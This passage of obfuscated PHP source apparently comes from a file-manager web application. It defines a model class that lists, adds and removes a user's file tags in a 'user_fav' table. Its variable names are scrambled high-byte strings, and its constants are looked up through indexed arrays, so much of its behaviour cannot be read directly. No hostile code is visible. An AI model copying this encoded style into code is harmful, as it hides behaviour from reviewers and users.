($GLOBALS[$ËŞÛĞ‰[6]][$ËŞÛĞ‰[102]][$ËŞÛĞ‰[897]]) { $×óÕ” = $GLOBALS[$ËŞÛĞ‰[6]][$ËŞÛĞ‰[102]][$ËŞÛĞ‰[897]]; if (!mk_dir($×óÕ”) || !is_writable($×óÕ”) || !IO::mkfile($×óÕ” . $ËŞÛĞ‰[898])) { $×óÕ” = TEMP_FILES; } } return $×óÕ”; } } goto eÙóÒôò»•; e÷Şàí¹½Ã: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($ë‚è¤¨œ) { $”œ½ºÆ¦ =& $_SERVER[ŒÅŸ‹ä†]; return array($”œ½ºÆ¦[2238] => array($”œ½ºÆ¦[2670] . USER_ID, $”œ½ºÆ¦[2239])); } protected function ___listData() { $½¥¿å‰Ü =& $_SERVER[ŒÅŸ‹ä†]; $Êú·§½Ó = array($½¥¿å‰Ü[1911] => USER_ID, $½¥¿å‰Ü[578] => array($½¥¿å‰Ü[2242], 0)); $Ÿ•Ú“ï = $½¥¿å‰Ü[2671]; $ŒÙŞ»ÑÍ = $this->field($Ÿ•Ú“ï)->where($Êú·§½Ó)->order($½¥¿å‰Ü[2244])->select(); return $ŒÙŞ»ÑÍ ? $ŒÙŞ»ÑÍ : array(); } protected function addToTag($ÈÌ‹ÈŸÙ, $Ô¯°ŒÒ) { $©à‹ÛÏÒ =& $_SERVER[ŒÅŸ‹ä†]; if (!Model($©à‹ÛÏÒ[2395])->listData($Ô¯°ŒÒ)) { return !1; } if (is_numeric($ÈÌ‹ÈŸÙ)) { $Çüü¤¶¬ = Model($©à‹ÛÏÒ[929])->pathInfo($ÈÌ‹ÈŸÙ); if (!$Çüü¤¶¬) { return !1; } } else { $Çüü¤¶¬ = IO::infoSimple($ÈÌ‹ÈŸÙ); if (!$Çüü¤¶¬) { return !1; } $Êª“‘’û = $Çüü¤¶¬[$©à‹ÛÏÒ[42]]; $ÂÊÒ‹í¿ = $Çüü¤¶¬[$©à‹ÛÏÒ[43]]; if (isset($Çüü¤¶¬[$©à‹ÛÏÒ[505]])) { $ÂÊÒ‹í¿ = $Çüü¤¶¬[$©à‹ÛÏÒ[505]] == $©à‹ÛÏÒ[101] ? $©à‹ÛÏÒ[88] : $©à‹ÛÏÒ[241]; } } $„˜¯ƒ’± = array($©à‹ÛÏÒ[1911] => USER_ID, $©à‹ÛÏÒ[578] => $Ô¯°ŒÒ, $©à‹ÛÏÒ[515] => $ÈÌ‹ÈŸÙ, $©à‹ÛÏÒ[516] => $ÂÊÒ‹í¿ ? $ÂÊÒ‹í¿ : $©à‹ÛÏÒ[510], $©à‹ÛÏÒ[514] => $Êª“‘’û ? $Êª“‘’û : $©à‹ÛÏÒ[12], $©à‹ÛÏÒ[2130] => 0); if ($this->where($„˜¯ƒ’±)->find()) { return !1; } return $this->add($„˜¯ƒ’±); } protected function removeFromTag($§Êóï¹ƒ, $ïèñéš) { $ÕÒ‰ÂøÇ =& $_SERVER[ŒÅŸ‹ä†]; if (!Model($ÕÒ‰ÂøÇ[2395])->listData($ïèñéš)) { return !1; } if (is_array($§Êóï¹ƒ)) { $§Êóï¹ƒ = array($ÕÒ‰ÂøÇ[7], $§Êóï¹ƒ); } $ŠİŠìı® = array($ÕÒ‰ÂøÇ[1911] => USER_ID, $ÕÒ‰ÂøÇ[578] => $ïèñéš, $ÕÒ‰ÂøÇ[515] => $§Êóï¹ƒ); return $this->where($ŠİŠìı®)->delete(); } protected function removeByTag($İëûõÔ·) { $·£ º¢º =& $_SERVER[ŒÅŸ‹ä†]; if (!$İëûõÔ·) { return !1; } $¢ªŠ¹Û = array($·£ º¢º[1911] => USER_ID, $·£ º¢º[578] => $İëûõÔ·); return $this->where($¢ªŠ¹Û)->delete(); } protected function removeBySource($ãœİğ±) { $œˆâÎ¬• =& $_SERVER[ŒÅŸ‹ä†]; if (is_array($ãœİğ±)) { $ãœİğ± = array($œˆâÎ¬•[7], $ãœİğ±); } $ä°¥áÓ“ = array($œˆâÎ¬•[1911] => USER_ID, $œˆâÎ¬•[578] => array($œˆâÎ¬•[1125], 0), $œˆâÎ¬•[515] => $ãœİğ±); return $this->where($ä°¥áÓ“)->delete(); } }